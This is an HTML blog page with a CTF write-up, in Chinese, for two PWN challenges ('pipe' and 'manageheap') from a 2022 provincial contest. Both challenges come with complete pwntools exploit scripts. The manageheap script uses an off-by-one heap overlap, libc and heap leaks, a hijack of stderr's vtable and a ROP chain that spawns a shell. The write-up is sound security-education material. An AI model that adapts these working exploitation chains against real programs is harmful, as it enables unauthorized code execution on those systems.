@@ -1,0 +1,434 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2022年&#34;深信服&#34;杯-四川省赛-PWN-WP | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2022年&#34;深信服&#34;杯-四川省赛-PWN-WP | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="
+第一次参加省赛，而且状态不是很好。一题3血一题2血，中规中矩的成绩吧。不过可惜的是和一等奖无缘了
+
+pipe
+分析
+开幕雷击。考虑思路为在./ctf.sh中写入/bin/sh来getshell
+
+然后简单回溯一下写入过程：
+
+最开始的时候..." />
+    <meta name="keywords" content="WP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2022年&#34;深信服&#34;杯-四川省赛-PWN-WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-11-12
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/0eC34PvND/" class="post-tag">
+                  # WP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <blockquote>
+<p>第一次参加省赛，而且状态不是很好。一题3血一题2血，中规中矩的成绩吧。不过可惜的是和一等奖无缘了</p>
+</blockquote>
+<h1 id="pipe">pipe</h1>
+<h2 id="分析">分析</h2>
+<p>开幕雷击。考虑思路为在<code>./ctf.sh</code>中写入<code>/bin/sh</code>来getshell</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/12/379c452516268.png" alt="1668262407288.png" loading="lazy"></figure>
+<p>然后简单回溯一下写入过程：</p>
+<ul>
+<li>最开始的时候创建一个<code>./ctf.sh</code>，</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/12/c6e8734ec37ad.png" alt="1668262727091.png" loading="lazy"></figure>
+<ul>
+<li>将<code>/bin/sh</code>写入<code>buffer</code>，</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/12/7ade1c8bf08d8.png" alt="1668262660790.png" loading="lazy"></figure>
+<ul>
+<li>将buffer写入<code>./ctf.sh</code>，</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/12/542e82cd101f5.png" alt="1668262615222.png" loading="lazy"></figure>
+<ul>
+<li>触发后门</li>
+</ul>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sys
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+port = int(sys.argv[1])
+if port == 0:
+	p = process('./pipe')
+else:
+	p = remote('172.16.159.59', port)
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+def choice(idx):
+	sla('cmd&gt;&gt;&gt;', str(idx))
+
+sla('path&gt;', './ctf.sh')
+choice(2)
+sla('size&gt;', '10')
+sla('put&gt;', '/bin/sh')
+
+choice(5)
+choice(6)
+
+p.interactive()
+</code></pre>
+<h1 id="manageheap">manageheap</h1>
+<h2 id="分析-2">分析</h2>
+<p>2.35下的堆题，洞在修改堆块的功能里，可以off by one（实际上是溢出8bytes）</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/12/9553c01011ebe.png" alt="1668261344195.png" loading="lazy"></figure>
+<p>add的时候先开了一个0x30的chunk来管理一个major，结构体大概如下：</p>
+<pre><code class="language-c">struct manageHeap{
+	char name[0x10];
+    intprt_t *data;
+    int data_len;
+};
+</code></pre>
+<p>且最大只能申请到0x290的chunk。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/12/48a56956ded0e.png" alt="1668261477937.png" loading="lazy"></figure>
+<p>由于读写都是从0x31的堆块上获取的，所以利用off by one造一个overlap，通过不断释放和申请chunk A，修改被重叠的chunk B中的data指针，就能达到任意地址读写了。（造overlap时是partial overwrite了一个data指针，所以远程是<code>1/16</code>的概率打通，本地调试时可以先关掉alsr）</p>
+<p>leak堆基址很简单，但是leak libc基址就有点被限制。因为最大只能申请到0x290，不足以直接绕过tcache bin，且堆块限制了7个，也没法正常填满tcache bin来进unsorted bin。所以这里我还打了一次size，让一个chunk的大小变成能直接进入unsorted bin的大小。</p>
+<p>而且由于这题无法从main退出，也无<code>exit</code>（<code>_exit</code>是不会触发<code>__IO_flush_all_lockp</code>的），所以考虑用<code>house of kiwi</code>，通过<code>__malloc_assert</code>来劫持控制流。</p>
+<p>我这里是打的<code>stderr-&gt;_IO_file_xsputn</code>，走<code>house of apple2</code>这条链子，然后由于没开沙箱，所以简单syscall调用一下<code>execve('/bin/sh', 0, 0)</code>。（不用<code>system</code>是因为栈大小不好预留）</p>
+<p>至于为什么打<code>__malloc_assert</code>也能稳定触发<code>stderr-&gt;_IO_file_xsputn</code>，可以参考一下源码：</p>
+<pre><code class="language-c">static void
+__malloc_assert (const char *assertion, const char *file, unsigned int line,
+		 const char *function)
+{
+  (void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s' failed.\n&quot;,
+		     __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,
+		     file, line,
+		     function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,
+		     assertion);
+  fflush (stderr);
+  abort ();
+}
+</code></pre>
+<p>这里在<code>__fxprintf</code>内部调用的是<code>stderr-&gt;_IO_file_xsputn</code>，且此方法应该能适用于接下来libc-2.36里删除了<code>fflush(stderr)</code>后的<code>__malloc_assert</code>，而且劫持<code>stderr</code>，一般情况下不会出问题，比劫持<code>stdout</code>要稳定。</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sys
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+port = int(sys.argv[1])
+if port == 0:
+	p = process('./manageheap')
+else:
+	p = remote('172.16.159.59', port)
+
+elf = ELF('./manageheap')
+libc = elf.libc
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+def choice(idx):
+	sla('ice: ', str(idx))
+
+def add(num, name='kotori', content='saoe'):
+	choice(1)
+	sla('ber:', str(num))
+	sa('name:', name)
+	sa('&gt; ', content)
+
+def delete(idx):
+	choice(2)
+	sla('idx:', str(idx))
+
+def show(idx):
+	choice(3)
+	sla('idx:', str(idx))
+
+def edit(idx, buf, content):
+	choice(4)
+	sla('idx:', str(idx))
+	sa('id:', buf)
+	p.send(content)
+
+add(0x68//8) # 0
+
+add(0x28//8) # 1
+add(0x200//8) # 2
+add(0x200//8) # 3
+
+delete(0)
+pay = p64(0xbaadf00d)*(0x68//8)
+add(0x68//8, 'kotori', pay) # 0
+
+edit(0, p64(0x31), p64(0x31+0x30))
+delete(1)
+add((0x28)//8) # 1
+
+pay = b'a'*0x28 + p64(0x31) + b'a'*0x10 + b'\xc0\x93' # partial overwrite
+add((0x58)//8, 'kotori', pay) # 4
+
+edit(1, p64(0x211), p64(0x211+0x30+0x210))
+delete(2) # unsorted
+delete(4)
+
+pay = b'a'*0x28 + p64(0x31) + b'a'*0x10 + b'\xd0'
+add((0x58)//8, 'kotori', pay) # 4
+show(1)
+
+ru('ber: ')
+libcbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) - 0x219ce0
+print(hex(libcbase))
+
+delete(4)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + b'\xa0'
+add((0x58)//8, 'kotori', pay) # 2
+show(1)
+
+ru('a'*0x10)
+heapbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) - 0x3d0
+print(hex(heapbase))
+
+# stderr -&gt; _IO_file_xsputn
+
+stderr = libcbase + 0x21a6a0
+_wfile_jumps = libcbase + 0x2160c0 # _IO_wfile_overflow
+setcontext = libcbase + libc.symbols['setcontext']
+# sys = libcbase + libc.symbols['system']
+ret = libcbase + 0x000000000002a3e5 + 1
+pop_rax = libcbase + 0x0000000000045eb0 # pop rax ; ret
+syscall = libcbase + 0x0000000000029db4 # syscall
+
+pay = b'/bin/sh\x00'
+pay = pay.ljust(0x68, b'\x00')
+pay += p64(heapbase+0x460) # rdi
+pay = pay.ljust(0xa0, b'\x00')
+pay += p64(heapbase+0x880) # rsp
+pay += p64(ret) # rcx -&gt; rip
+pay = pay.ljust(0xe0, b'\x00')
+pay += p64(heapbase+0x880)
+add((0x200//8), 'kotori', pay) # 5 (0x460) # wide_data &amp; SigreturnFrame
+pay = p64(pop_rax) + p64(59) + p64(syscall)
+pay = pay.ljust(0x68, b'\x00')
+pay += p64(setcontext+61)
+add((0x200//8), 'kotori', pay) # 6 (0x880) # wide_data_vtable &amp; rop
+
+delete(2)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + p64(stderr+0xd8) + p64(0xff0)
+add((0x58)//8, 'kotori', pay) # 2
+
+# g()
+edit(1, p64(libcbase+0x216600), p64(_wfile_jumps-0x20)) # attack vtable
+
+delete(2)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + p64(stderr) + p64(0xff0)
+add((0x58)//8, 'kotori', pay) # 2
+
+edit(1, p64(libcbase+0x2198a0), p64(heapbase+0x460)) # attack _wide_data
+
+delete(2)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + p64(stderr) + p64(0xff0)
+add((0x58)//8, 'kotori', pay) # 2
+
+edit(1, p64(0xfbad2087), p64(0)) # attack _flags
+
+delete(2)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + p64(heapbase+0xa80) + p64(0xff0)
+add((0x58)//8, 'kotori', pay) # 2
+
+edit(1, p64(0x20581), p64(0x80)) # attack top_size
+
+delete(2)
+
+choice(1)
+sla('number:', '64')
+
+p.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#pipe">pipe</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+<li><a href="#manageheap">manageheap</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-2">分析</a></li>
+<li><a href="#exp-2">exp</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/frida hook/">
+              <h3 class="post-title">
+                Frida Hook初探
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
